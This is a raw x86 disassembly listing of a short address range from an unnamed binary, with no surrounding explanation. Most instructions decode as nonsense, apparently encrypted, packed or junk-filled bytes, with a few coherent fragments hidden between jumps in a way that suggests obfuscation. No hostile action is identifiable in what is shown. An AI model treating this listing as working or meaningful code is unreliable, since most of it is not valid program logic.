  40b317:	jle    0x40b2fa
  40b319:	sub    al,0xc8
  40b31b:	dec    ebp
  40b31c:	inc    ecx
  40b31d:	fld    QWORD PTR ds:0xf1ef8ec5
  40b323:	push   esi
  40b324:	mov    bl,BYTE PTR [ebp+0x732ce2e6]
  40b32a:	adc    ebx,DWORD PTR [edx-0x2a]
  40b32d:	call   0x35e0ef4b
  40b332:	push   edi
  40b333:	nop
  40b334:	mov    al,ds:0x520f199f
  40b339:	sub    al,0xb3
  40b33b:	xchg   ecx,eax
  40b33c:	mov    al,bh
  40b33e:	add    BYTE PTR [edx-0x6af7abfb],0x50
  40b345:	in     al,dx
  40b346:	mov    eax,DWORD PTR [edx*2+0x5182299b]
  40b34d:	jae    0x40b378
  40b34f:	pop    ecx
  40b350:	ficomp WORD PTR [ebp-0x3a]
  40b353:	mov    fs,WORD PTR [ebp+esi*8-0x7392e288]
  40b35a:	in     eax,dx
  40b35b:	sub    BYTE PTR [esi-0x70475f92],dh
  40b361:	mov    dl,0xc8
  40b363:	xchg   ebx,eax
  40b364:	xchg   edi,esi
  40b366:	scas   eax,DWORD PTR es:[edi]
  40b367:	int3   
  40b368:	fcom   st(0)
  40b36a:	loop   0x40b333
  40b36c:	xor    esi,edi
  40b36e:	aam    0xc6
  40b370:	xacquire xchg BYTE PTR [edi+0x7eb81e93],bh
  40b377:	fwait
  40b378:	loopne 0x40b31a
  40b37a:	sub    BYTE PTR [ebp+eiz*1+0x2aa0614c],bl
  40b381:	sub    DWORD PTR [ebx-0x4ca57fac],esi
  40b387:	pushf  
  40b388:	jecxz  0x40b36d
  40b38a:	push   0xffffff92
  40b38c:	jnp    0x40b3c6
  40b38e:	mov    al,0xba
  40b390:	(bad)  
  40b391:	push   ebx
  40b392:	push   es
  40b393:	mov    ecx,0xe1f295a7
  40b398:	fiadd  DWORD PTR [esp+esi*1]
  40b39b:	jge    0x40b3dc
  40b39d:	sbb    BYTE PTR [esi],ah
  40b39f:	jmp    0x1aef:0x8dba99d4
  40b3a6:	add    al,0xbd
  40b3a8:	lea    edx,[ebx+0x6a]
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	push   eax
  40b3ad:	xor    dh,bh
  40b3af:	mov    eax,0xb0fd9486
  40b3b4:	int    0x3a
  40b3b6:	lock xchg esp,eax
  40b3b8:	dec    edx
  40b3b9:	jo     0x40b424
  40b3bb:	jns    0x40b372
  40b3bd:	mov    bl,0x2a
  40b3bf:	aad    0xe7
  40b3c1:	adc    al,0xe3
  40b3c3:	test   al,0xaa
  40b3c5:	ds aam 0xa7
  40b3c8:	mov    eax,ds:0x8b08458b
  40b3cd:	dec    ebp
  40b3ce:	clc    
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0x67f5fb55
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	sbb    BYTE PTR [ecx-0x17232010],bl
  40b3f6:	push   esi
  40b3f7:	dec    edx
  40b3f8:	and    edi,0xffffff88
  40b3fb:	fcmovbe st,st(4)
  40b3fd:	xchg   ebx,eax
  40b3fe:	push   esp
  40b3ff:	stos   BYTE PTR es:[edi],al
  40b400:	mov    ebx,0x90ca7497
  40b405:	push   esi
  40b406:	shl    DWORD PTR ds:0x96658a96,1
  40b40c:	jno    0x40b435
  40b40e:	sets   BYTE PTR [eax+0x18]
  40b412:	mov    al,0x9
  40b414:	retf   
  40b415:	ds xor eax,0x38f5510d
  40b41b:	xchg   BYTE PTR [ebx],bl
  40b41d:	sub    bl,BYTE PTR [eax-0x13b6e11e]
  40b423:	es xor eax,0xeb8ba64c
  40b429:	aam    0x4
  40b42b:	fsubr  DWORD PTR [ecx]
  40b42d:	sar    DWORD PTR [esi],0x22
  40b430:	xchg   esp,eax
  40b431:	sub    edx,DWORD PTR [edx+0x7d]
  40b434:	es in  al,0x30
  40b437:	xchg   esp,eax
  40b438:	stos   BYTE PTR es:[edi],al
  40b439:	or     DWORD PTR [eax],eax
  40b43b:	push   ebp
  40b43c:	mov    esp,esi
  40b43e:	xchg   DWORD PTR [ebx-0x476204a],eax
  40b444:	outs   dx,BYTE PTR ds:[esi]
  40b445:	popf   
  40b446:	push   ss
  40b447:	clc    
  40b448:	adc    eax,0x4cb0bdca
  40b44d:	scas   al,BYTE PTR es:[edi]
  40b44e:	int3   
  40b44f:	mov    edx,0xb0b37b0
  40b454:	mov    al,ds:0x21c54ee4
  40b459:	gs out dx,eax
  40b45b:	lods   al,BYTE PTR ds:[esi]
  40b45c:	jne    0x40b3f1
  40b45e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b45f:	dec    esi
  40b460:	xchg   BYTE PTR [edx],ah
  40b462:	dec    esi
  40b463:	push   eax
  40b464:	adc    eax,0x42e2385c
  40b469:	push   esp
  40b46a:	dec    eax
  40b46b:	and    dh,BYTE PTR [bp-0x8]
  40b46f:	dec    eax
  40b470:	popf   
  40b471:	rol    DWORD PTR [esi],0xd4
  40b474:	dec    esp
  40b475:	fidivr WORD PTR [esi-0x19eeb1c8]
  40b47b:	cmp    bh,ah
  40b47d:	fwait
  40b47e:	clc    
  40b47f:	(bad)  
  40b480:	jae    0x40b436
  40b482:	dec    ebx
  40b483:	sar    BYTE PTR [esi],1
  40b485:	mov    esi,0xf82aa00b
  40b48a:	pop    ds
  40b48b:	jbe    0x40b50b
  40b48d:	lahf   
  40b48e:	dec    eax
  40b48f:	imul   edi,DWORD PTR [eax],0xffffffee
  40b492:	push   ebp
  40b493:	rcr    DWORD PTR [edi-0x88075e5],1
  40b499:	retf   0x6056
  40b49c:	cmp    BYTE PTR [esp+ebx*1-0x64],0x6a
  40b4a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4a2:	dec    edx
  40b4a3:	mov    ebp,0xfb30085
  40b4a8:	sbb    esi,DWORD PTR [ebx+0x70]
  40b4ab:	and    cl,bl
  40b4ad:	out    dx,eax
  40b4ae:	js     0x40b4c3
  40b4b0:	ins    BYTE PTR es:[edi],dx
  40b4b1:	sub    BYTE PTR [ebx-0x44],al
  40b4b4:	rol    DWORD PTR [ebp+ecx*4-0x666a114b],cl
  40b4bb:	jns    0x40b443
  40b4bd:	inc    edi
  40b4be:	pop    es
  40b4bf:	mov    dl,0xbb
  40b4c1:	mov    ah,0x4e
  40b4c3:	sbb    bh,bh
  40b4c5:	jecxz  0x40b53f
  40b4c7:	jnp    0x40b50b
  40b4c9:	inc    eax
  40b4ca:	ins    BYTE PTR es:[edi],dx
  40b4cb:	push   esp
  40b4cc:	fwait
  40b4cd:	outs   dx,BYTE PTR ds:[esi]
  40b4ce:	inc    edi
  40b4cf:	sbb    BYTE PTR [edx],dh
  40b4d1:	aad    0x3b
  40b4d3:	adc    esi,DWORD PTR [ebx+0x5fe34b29]
  40b4d9:	(bad)  
  40b4da:	push   ebx
  40b4db:	add    DWORD PTR [edx-0x33],edi
  40b4de:	sub    eax,0xbb412db4
  40b4e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4e4:	lock das 
  40b4e6:	stc    
  40b4e7:	push   edx
  40b4e8:	popa   
  40b4e9:	in     eax,dx
  40b4ea:	test   eax,0xe14622e8
  40b4ef:	xlat   BYTE PTR ds:[ebx]
  40b4f0:	cs ss int3 
  40b4f3:	adc    dh,BYTE PTR ds:0x5dc40e3a
  40b4f9:	and    eax,0xbf2c6fcc
  40b4fe:	push   DWORD PTR [ecx]
  40b500:	jae    0x40b491
  40b502:	mov    ecx,0x68615eb2
  40b507:	adc    ebp,DWORD PTR [ecx]
  40b509:	aam    0x97
  40b50b:	push   0xffffffc4
  40b50d:	rcr    DWORD PTR [ecx],1
  40b50f:	enter  0x1c1f,0xb9
  40b513:	mov    edi,0xc0903c9e
  40b518:	pop    esi
  40b519:	stos   DWORD PTR es:[edi],eax
  40b51a:	(bad)  
  40b51b:	push   ss
  40b51c:	test   eax,0x710229c9
  40b521:	pop    ebx
  40b522:	in     eax,dx
  40b523:	xchg   BYTE PTR [ebx],bl
  40b525:	push   edx
  40b526:	adc    al,0xab
  40b528:	cwde   
  40b529:	sti    
  40b52a:	add    esi,DWORD PTR [ebx-0x38]
  40b52d:	in     al,dx
  40b52e:	clc    
  40b52f:	sub    al,0xe9
  40b531:	add    ebx,DWORD PTR [ebx-0x43]
  40b534:	cmc    
  40b535:	pop    eax
  40b536:	mov    al,0xad
  40b538:	sbb    al,BYTE PTR [edx+0x4c1b94de]
  40b53e:	clc    
  40b53f:	(bad)  
  40b540:	aam    0x11
  40b542:	mov    ds:0x879aaba4,eax
  40b547:	imul   eax,DWORD PTR [esi],0x88dfe416
  40b54d:	and    al,0xd5
  40b54f:	jne    0x40b505
  40b551:	mov    al,0xee
  40b553:	pop    es
  40b554:	jns    0x40b523
  40b556:	pop    eax
  40b557:	jae    0x40b535
  40b559:	mov    ebx,0xf71fb137
  40b55e:	je     0x40b5c4
  40b560:	outs   dx,DWORD PTR ds:[esi]
  40b561:	dec    edx
  40b562:	xor    ecx,edx
  40b564:	pusha  
  40b565:	jp     0x40b5aa
  40b567:	xor    bl,BYTE PTR [edx+0x3a]
  40b56a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b56b:	jae    0x40b5b4
  40b56d:	dec    esi
  40b56e:	mov    esi,0x4800f76d
  40b573:	data16 mov bl,0x2e
  40b576:	adc    eax,0xa562cb18
  40b57b:	out    0x26,al
  40b57d:	and    DWORD PTR [edi-0x46],ecx
  40b580:	out    0x48,al
  40b582:	adc    ch,bl
  40b584:	pop    es
  40b585:	and    dh,bl
  40b587:	sbb    DWORD PTR [ebp-0x49],0xafb1effb
  40b58e:	mov    al,0x4c
  40b590:	adc    al,0xe3
  40b592:	sub    DWORD PTR [edx+0x351ce266],ecx
  40b598:	lods   eax,DWORD PTR ds:[esi]
  40b599:	fidivr DWORD PTR [ebx-0xdfcd779]
  40b59f:	push   ss
  40b5a0:	jecxz  0x40b620
  40b5a2:	mov    al,0xa9
  40b5a4:	addr16 inc esp
  40b5a6:	xchg   esp,eax
  40b5a7:	xchg   esp,eax
  40b5a8:	test   eax,0x2fa789d2
  40b5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ae:	stc    
  40b5af:	mov    esp,0x12b8c956
  40b5b4:	repz ret 0x3c30
  40b5b8:	jmp    0x40b575
  40b5ba:	test   edx,ebx
  40b5bc:	pop    es
  40b5bd:	adc    al,0x88
  40b5bf:	or     bh,0x51
  40b5c2:	cmp    ecx,DWORD PTR [ebp+0x50]
  40b5c5:	leave  
  40b5c6:	pusha  
  40b5c7:	inc    esp
  40b5c8:	(bad)
  40b5cc:	pop    ecx
  40b5cd:	ja     0x40b5d7
  40b5cf:	xchg   esi,eax
  40b5d0:	bound  edi,QWORD PTR [edi]
  40b5d2:	(bad)  
  40b5d3:	out    0x55,al
  40b5d5:	xchg   BYTE PTR [ebx+edx*2-0x5176a041],ch
  40b5dc:	out    0xbf,al
  40b5de:	rcl    BYTE PTR [eax],0x8d
  40b5e1:	(bad)  
  40b5e2:	and    eax,0x572b432c
  40b5e7:	sbb    al,0x6c
  40b5e9:	ret    
  40b5ea:	and    DWORD PTR [esi+0x58],0xffffff8b
  40b5ee:	call   FWORD PTR [ebx]
  40b5f0:	jle    0x40b573
  40b5f2:	es cmp dl,cl
  40b5f5:	jns    0x40b578
  40b5f7:	inc    esi
  40b5f8:	jmp    0x40b58d
  40b5fa:	mov    esi,0xc105c149
  40b5ff:	mov    ebp,0x496c5d62
  40b604:	sahf   
  40b605:	push   edx
  40b606:	ins    DWORD PTR es:[edi],dx
  40b607:	rcl    esi,0xb2
  40b60a:	cwde   
  40b60b:	fcom   DWORD PTR [ebp+0x45c79304]
  40b612:	and    DWORD PTR [edi],0x37
  40b615:	imul   ebp,DWORD PTR [esi-0x43],0x90a151c3
  40b61c:	mov    ebp,0xdc9d7dcb
  40b621:	je     0x40b68c
  40b623:	jnp    0x40b60e
  40b625:	xor    dl,ah
  40b627:	fwait
  40b628:	dec    edi
  40b629:	je     0x40b619
  40b62b:	mov    dl,0x93
  40b62d:	cdq    
  40b62e:	jno    0x16dcc925
  40b634:	inc    ebp
  40b635:	lea    esi,[ebx+0x64]
  40b638:	xor    BYTE PTR [ebp-0x66a0367d],dl
  40b63e:	loop   0x40b675
  40b640:	lds    ebp,FWORD PTR [edx]
  40b642:	xor    eax,0xbc093f8
  40b647:	test   edi,edx
  40b649:	xchg   BYTE PTR [ecx],bh
  40b64b:	mov    eax,ds:0xbd4bbb75
  40b650:	popa   
  40b651:	leave  
  40b652:	cmc    
  40b653:	in     eax,0x6f
  40b655:	arpl   WORD PTR [edx+0x1058f466],dx
  40b65b:	xchg   edi,eax
  40b65d:	or     dl,al
  40b65f:	retf   0x5ad
  40b662:	iret   
  40b663:	pop    es
  40b664:	test   eax,0xf2663cda
  40b669:	add    DWORD PTR [ecx],ecx
  40b66b:	out    dx,al
  40b66c:	stos   BYTE PTR es:[edi],al
  40b66d:	fiadd  DWORD PTR [ebx+0x36]
  40b670:	sti    
  40b671:	jns    0x40b6eb
  40b673:	sub    dl,cl
  40b675:	ins    DWORD PTR es:[edi],dx
  40b676:	xor    eax,0xf9d41106
  40b67b:	jbe    0x40b6f3
  40b67d:	push   ebx
  40b67e:	or     eax,DWORD PTR [eax]
  40b680:	pop    eax
  40b681:	je     0x40b622
  40b683:	pop    esi
  40b684:	jl     0x40b624
  40b686:	loope  0x40b696
  40b688:	cmp    eax,0xdb8e5e97
  40b68d:	call   0xd61c:0xf99a0d15
  40b694:	call   0x49c781a7
  40b699:	add    al,0xbc
  40b69b:	dec    edx
  40b69c:	stos   BYTE PTR es:[edi],al
  40b69d:	xor    ecx,ebp
  40b69f:	fs inc esp
  40b6a1:	dec    eax
  40b6a2:	sbb    eax,0x8fa3a7b9
  40b6a7:	xor    BYTE PTR [ecx-0x1a],0xfb
  40b6ab:	pop    eax
  40b6ac:	scas   eax,DWORD PTR es:[edi]
  40b6ad:	rcr    BYTE PTR [ebx],0x2f
  40b6b0:	xchg   ah,al
  40b6b2:	fdivp  st(7),st
  40b6b4:	out    0x3,eax
  40b6b6:	push   edx
  40b6b7:	shr    DWORD PTR [esi-0x7e36760],0x11
  40b6be:	xor    DWORD PTR [edi],esp
  40b6c0:	xor    edx,DWORD PTR [eax+0xd5fd4f3]
  40b6c6:	push   edx
  40b6c7:	and    eax,0xdbc98025
  40b6cc:	(bad)  
  40b6cd:	lods   eax,DWORD PTR ds:[esi]
  40b6ce:	cmp    eax,0x82a19e3b
  40b6d3:	rol    BYTE PTR [esi-0x562843f7],1
  40b6d9:	xchg   edi,eax
  40b6da:	call   0xa8e74fdd
  40b6df:	push   esi
  40b6e0:	mov    edx,DWORD PTR [edx+0x21]
  40b6e3:	je     0x40b742
  40b6e5:	sbb    ah,dh
  40b6e7:	inc    edi
  40b6e8:	mov    ah,0xc6
  40b6ea:	mov    ebx,0xb0a85874
  40b6ef:	mov    edi,0x7adc30f3
  40b6f4:	mov    DWORD PTR [ecx],eax
  40b6f6:	jmp    0x40c082
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [edi+ebx*2-0x12],gs
  40b71b:	das    
  40b71c:	adc    al,0xf8
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	jo     0x40b74a
  40b726:	jecxz  0x40b792
  40b728:	ins    BYTE PTR es:[edi],dx
  40b729:	cwde   
  40b72a:	sub    ah,dh
  40b72c:	shl    DWORD PTR [ebx-0x39],0xa6
  40b730:	stc    
  40b731:	ret    
  40b732:	fsub   QWORD PTR [eax+0x30c76761]
  40b738:	cmp    eax,ebp
  40b73a:	mov    bl,0xfc
  40b73c:	xor    eax,0xc279d6da
  40b741:	push   ebx
  40b742:	jno    0x40b7bf
  40b744:	push   esp
  40b745:	mov    ds:0xb51da33,eax
  40b74a:	sbb    BYTE PTR [ebp+0x1f],0x43
  40b74e:	sub    esp,DWORD PTR [edx-0x3f443a06]
  40b754:	mov    ch,0x1b
  40b756:	mov    ebp,0xc479a1ff
  40b75b:	xor    DWORD PTR [eax+0x5f],ebp
  40b75e:	out    0x19,al
  40b760:	out    0xa2,eax
  40b762:	mov    eax,0x31e01ba9
  40b767:	in     al,dx
  40b768:	add    DWORD PTR [ebx-0x4af9995b],ebx
  40b76e:	mov    edx,0x3ff9e5a9
  40b773:	add    eax,0x17d6cac2
  40b778:	push   0x4ddde02c
  40b77d:	enter  0xc228,0x8a
  40b781:	addr16 xchg ecx,eax
  40b783:	and    al,0x5e
  40b785:	stos   DWORD PTR es:[edi],eax
  40b786:	lods   al,BYTE PTR ds:[esi]
  40b787:	xor    ah,ch
  40b789:	sub    dh,dh
  40b78b:	in     eax,dx
  40b78c:	shl    BYTE PTR [edx-0x37],1
  40b78f:	mov    ah,0xd8
  40b791:	out    dx,eax
  40b792:	scas   eax,DWORD PTR es:[edi]
  40b793:	(bad)  
  40b794:	lahf   
  40b795:	mov    dl,0xbb
  40b797:	je     0x40b801
  40b799:	data16 ror BYTE PTR [ebx+0x33],0x77
  40b79e:	rcl    ecx,0x96
  40b7a1:	xchg   ebx,eax
  40b7a2:	and    bh,BYTE PTR [esi]
  40b7a4:	sub    al,0x3
  40b7a6:	cwd    
  40b7a8:	sbb    edx,DWORD PTR [edx+0x1b]
  40b7ab:	(bad)  
  40b7ac:	ror    BYTE PTR [esi-0x2d],1
  40b7af:	adc    edi,DWORD PTR [edi+0x305cec13]
  40b7b5:	or     al,0xfd
  40b7b7:	outs   dx,DWORD PTR ds:[esi]
  40b7b8:	jmp    0x40b745
  40b7ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7bb:	popa   
  40b7bc:	sar    BYTE PTR [ebx-0x4a],0xde
  40b7c0:	mov    ecx,0x6c15f9b5
  40b7c5:	sahf   
  40b7c6:	add    dh,BYTE PTR [ebp-0x55]
  40b7c9:	repz and ebp,DWORD PTR [ecx-0x20]
  40b7cd:	daa    
  40b7ce:	dec    edi
  40b7cf:	mul    dl
  40b7d1:	sub    eax,0x56a1314a
  40b7d6:	iret   
  40b7d7:	in     eax,dx
  40b7d8:	inc    eax
  40b7d9:	inc    ecx
  40b7da:	sub    al,dh
  40b7dc:	call   0x6054509f
  40b7e1:	cmp    BYTE PTR [ebx+ebp*1],dl
  40b7e4:	push   edi
  40b7e5:	inc    edx
  40b7e6:	adc    eax,0x41ebb4fe
  40b7eb:	sbb    eax,0x762baa8e
  40b7f0:	and    al,0xc1
  40b7f2:	mov    bh,ah
  40b7f4:	fsubr  DWORD PTR [edi]
  40b7f6:	fldlg2 
  40b7f8:	(bad)  
  40b7f9:	call   0xe7fb97d4
  40b7fe:	in     al,dx
  40b7ff:	bound  ebp,QWORD PTR ds:0x4b51a97c
  40b805:	push   ebx
  40b806:	loopne 0x40b868
  40b808:	xchg   esp,eax
  40b809:	gs jg  0x40b85c
  40b80c:	dec    ecx
  40b80d:	cmp    DWORD PTR [edx-0x3f],edx
  40b810:	clc    
  40b811:	xchg   ecx,eax
  40b812:	(bad)  
  40b813:	or     cl,dh
  40b815:	aam    0x14
  40b817:	mov    ds:0xc606e491,al
  40b81c:	je     0x40b848
  40b81e:	js     0x40b816
  40b820:	loop   0x40b7f2
  40b822:	repnz nop
  40b824:	aaa    
  40b825:	lds    esp,FWORD PTR [esp+eax*2+0x4bd1ed6]
  40b82c:	mov    ah,0x2b
  40b82e:	mov    esi,0x289d97f7
  40b833:	mov    dh,0xb2
  40b835:	dec    eax
  40b836:	and    al,0xbd
  40b838:	cs xchg edi,eax
  40b83a:	push   DWORD PTR [ecx]
  40b83c:	jbe    0x40b86d
  40b83e:	jmp    0x40b881
  40b840:	imul   ebp,DWORD PTR [esi],0x7bfd23a7
  40b846:	mov    ecx,0x68a90edf
  40b84b:	jns    0x40b890
  40b84d:	push   edi
  40b84e:	jne    0x40b863
  40b850:	jnp    0x40b8cd
  40b852:	retf   
  40b853:	mov    ch,0x16
  40b855:	xchg   BYTE PTR [ecx-0x54b54d81],dl
  40b85b:	fcmovnb st,st(5)
  40b85d:	fcmovu st,st(3)
  40b85f:	xchg   esp,eax
  40b860:	(bad)  
  40b861:	sbb    al,BYTE PTR [eax-0x41]
  40b864:	xchg   edx,eax
  40b865:	mov    eax,0xb01de6e7
  40b86a:	in     al,dx
  40b86b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b86c:	xlat   BYTE PTR ds:[ebx]
  40b86d:	sahf   
  40b86e:	sar    DWORD PTR [edx+eiz*2+0x16f36e23],1
  40b875:	rcl    esi,1
  40b877:	hlt    
  40b878:	paddw  mm7,QWORD PTR [edi+0x5973a582]
  40b87f:	sbb    BYTE PTR [ebx],al
  40b881:	ss repnz mov ebp,0x13008c4f
  40b888:	scas   al,BYTE PTR es:[edi]
  40b889:	out    0x51,al
  40b88b:	test   DWORD PTR [eax+0x26],ebx
  40b88e:	repz jne 0x40b90d
  40b891:	retf   
  40b892:	mov    ebx,0xd4e6bab2
  40b897:	ds ins DWORD PTR es:[edi],dx
  40b899:	mov    bh,BYTE PTR [ecx+0x141d0f52]
  40b89f:	jecxz  0x40b8de
  40b8a1:	cli    
  40b8a2:	bound  ebx,QWORD PTR [edx+0x5c22a5c]
  40b8a8:	lds    eax,FWORD PTR [esi+0x3ba3d3bb]
  40b8ae:	add    eax,0x6499a980
  40b8b3:	in     eax,dx
  40b8b4:	lods   eax,DWORD PTR ds:[esi]
  40b8b5:	leave  
  40b8b6:	adc    eax,0x148d60f5
  40b8bb:	dec    edx
  40b8bc:	ret    0x9abd
  40b8bf:	(bad)  
  40b8c3:	das    
  40b8c4:	lahf   
  40b8c5:	jbe    0x40b8c7
  40b8c7:	test   DWORD PTR [edx-0x11],edi
  40b8ca:	jge    0x40b947
  40b8cc:	inc    edi
  40b8cd:	mov    ch,0x9d
  40b8cf:	sub    ebx,DWORD PTR [edx+0x3a]
  40b8d2:	sbb    eax,0x11b84e2d
  40b8d7:	or     ah,BYTE PTR [eax]
  40b8d9:	add    DWORD PTR [edi+0x7a],edx
  40b8dc:	out    0x58,eax
  40b8de:	std    
  40b8df:	pop    edi
  40b8e0:	mov    dh,0x21
  40b8e2:	sbb    BYTE PTR [edi+0x45],0x68
  40b8e6:	test   eax,0xcfdd4efc
  40b8eb:	out    0x74,eax
  40b8ed:	sub    BYTE PTR [ebx],0x64
  40b8f0:	data16 (bad) 
  40b8f2:	in     eax,dx
  40b8f3:	fsubp  st(3),st
  40b8f5:	sbb    esi,DWORD PTR [ebx+0x1a]
  40b8f8:	shl    DWORD PTR [edx-0x76],1
  40b8fb:	in     al,0xe2
  40b8fd:	cmp    DWORD PTR [ecx+0x1d0f9cd9],ebp
  40b903:	sbb    DWORD PTR [esi-0x2],ebp
  40b906:	sbb    bh,BYTE PTR [esi]
  40b908:	push   es
  40b909:	cmp    eax,0x20d6138
  40b90e:	ins    DWORD PTR es:[edi],dx
  40b90f:	xor    eax,0xacd97347
  40b914:	dec    ecx
  40b915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b916:	shr    esp,1
  40b918:	push   esp
  40b919:	ss repnz push ecx
  40b91c:	sahf   
  40b91d:	retf   0x3cd6
  40b920:	scas   eax,DWORD PTR es:[edi]
  40b921:	in     eax,dx
  40b922:	ds sub eax,0x72d38742
  40b928:	ss mov ch,0x73
  40b92b:	sti    
  40b92c:	call   0x94e:0x72114813
  40b933:	adc    ecx,DWORD PTR [ecx]
  40b935:	jecxz  0x40b98a
  40b937:	dec    ecx
  40b938:	popf   
  40b939:	jecxz  0x40b9a9
  40b93b:	pop    ecx
  40b93c:	jmp    0x40b945
  40b93e:	xchg   edi,eax
  40b93f:	in     al,0xe4
  40b941:	mov    DWORD PTR [ecx],edi
  40b943:	icebp  
  40b944:	and    DWORD PTR [ebx],esi
  40b946:	retf   0xa21
  40b949:	add    eax,0xc919551d
  40b94e:	fimul  DWORD PTR [esi-0x28976e88]
  40b954:	and    dh,bl
  40b956:	or     ebx,DWORD PTR [ecx-0x9e1233a]
  40b95c:	sub    al,0xa7
  40b95e:	mov    ebp,0xfb267fe5
  40b963:	ficom  DWORD PTR [esp+ebx*4]
  40b966:	jns    0x40b988
  40b968:	jnp    0x40b8fa
  40b96a:	pop    esp
  40b96b:	and    eax,0xd912b31
  40b970:	pop    edx
  40b971:	jmp    0x5b71:0xd413a0bc
  40b978:	pop    ebp
  40b979:	(bad)  
  40b97b:	add    ecx,DWORD PTR [eax-0x41]
  40b97e:	or     eax,0x73bdd71a
  40b983:	mov    dh,0x46
  40b985:	push   es
  40b986:	pop    DWORD PTR [ebp+0x649b997]
  40b98c:	ror    DWORD PTR [esi+ecx*2-0x77],1
  40b990:	sar    BYTE PTR cs:[edx-0x3e],cl
  40b994:	push   ss
  40b995:	call   0xe813:0x7372861
  40b99c:	xor    eax,0xbdc43819
  40b9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9a2:	scas   eax,DWORD PTR es:[edi]
  40b9a3:	pop    edi
  40b9a4:	pop    DWORD PTR [ebp-0x1d79e3b7]
  40b9aa:	and    al,BYTE PTR [ecx-0x2731cf82]
  40b9b0:	cmp    DWORD PTR [ecx],0x543a2010
  40b9b6:	pop    edi
  40b9b7:	dec    eax
  40b9b8:	and    al,0x60
  40b9ba:	aad    0xb5
  40b9bc:	repz ret 0xfea0
  40b9c0:	jns    0x40b982
  40b9c2:	add    DWORD PTR [ecx+0x4a1c0815],0x5e5c58e0
  40b9cc:	in     al,dx
  40b9cd:	xor    ecx,DWORD PTR [eax-0x5d]
  40b9d0:	sar    DWORD PTR [ebp+0x5b],0x9
  40b9d4:	add    DWORD PTR [edx-0x12],ebx
  40b9d7:	jl     0x40b9e9
  40b9d9:	xor    BYTE PTR [ebx+0x22b94235],ah
  40b9df:	cs and eax,0x5f456e2a
  40b9e5:	ins    BYTE PTR es:[edi],dx
  40b9e6:	jb     0x40b96b
  40b9e8:	enter  0x701e,0x66
  40b9ec:	js     0x40b9f2
  40b9ee:	jns    0x40ba69
  40b9f0:	jnp    0x40b9bb
  40b9f2:	(bad)  
  40b9f3:	mov    ebp,0x7113ac7e
  40b9f8:	test   edx,ecx
  40b9fa:	hlt    
  40b9fb:	loope  0x40ba6c
  40b9fd:	sbb    ebp,DWORD PTR [edi]
  40b9ff:	aam    0xc5
  40ba01:	and    ecx,DWORD PTR [edi+esi*2+0x3898f237]
  40ba08:	push   edx
  40ba09:	xchg   edx,eax
  40ba0a:	xor    cl,BYTE PTR [ebx]
  40ba0c:	imul   esi,DWORD PTR [edi-0x100741f4],0x57
  40ba13:	pop    esi
  40ba14:	nop
  40ba15:	sub    bh,BYTE PTR [edx+0x38]
  40ba18:	cmp    DWORD PTR [ebx],0x4b372ece
  40ba1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba1f:	in     al,dx
  40ba20:	cld    
  40ba21:	xor    bl,BYTE PTR [edx]
  40ba23:	xor    esp,edi
  40ba25:	shr    BYTE PTR [edx-0x4e],1
  40ba28:	mov    eax,DWORD PTR [ebp-0x8]
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    bl,BYTE PTR [ebx+0x1051c138]
  40ba44:	xchg   DWORD PTR [esi+0x7e],edi
  40ba47:	jp     0x40bac6
  40ba49:	jle    0x40bac9
  40ba4b:	ror    BYTE PTR ds:0xf0697301,0x3a
  40ba52:	fldenv [ebx+0x57f5a2c]
  40ba58:	sbb    al,0x2d
  40ba5a:	out    dx,al
  40ba5b:	bound  edx,QWORD PTR [ecx+0x6e16e8b2]
  40ba61:	jae    0x40ba00
  40ba63:	(bad)  
  40ba64:	ds scas al,BYTE PTR es:[edi]
  40ba66:	cmp    eax,0xf2f87056
  40ba6b:	clc    
  40ba6c:	push   ecx
  40ba6d:	imul   ebx,DWORD PTR [ecx+0x1567f07a],0xffffffc1
  40ba74:	fistp  QWORD PTR [edx+0x44563d2c]
  40ba7a:	sbb    eax,0xdc39e03
  40ba7f:	mov    dh,0x44
  40ba81:	and    cl,dl
  40ba83:	aaa    
  40ba84:	(bad)  
  40ba87:	stos   BYTE PTR es:[edi],al
  40ba88:	or     eax,0x8770b5f9
  40ba8d:	jns    0x40ba71
  40ba8f:	loopne 0x40ba77
  40ba91:	sub    eax,DWORD PTR [edx-0x2b]
  40ba94:	push   edx
  40ba95:	inc    ebx
  40ba96:	ficom  DWORD PTR [ebx+eiz*4-0x58]
  40ba9a:	outs   dx,BYTE PTR ds:[esi]
  40ba9b:	pop    esi
  40ba9c:	ret    
  40ba9d:	jp     0x40ba92
  40ba9f:	cmp    al,BYTE PTR [ebx+0x2adf0100]
  40baa5:	stos   DWORD PTR es:[edi],eax
  40baa6:	pop    ebp
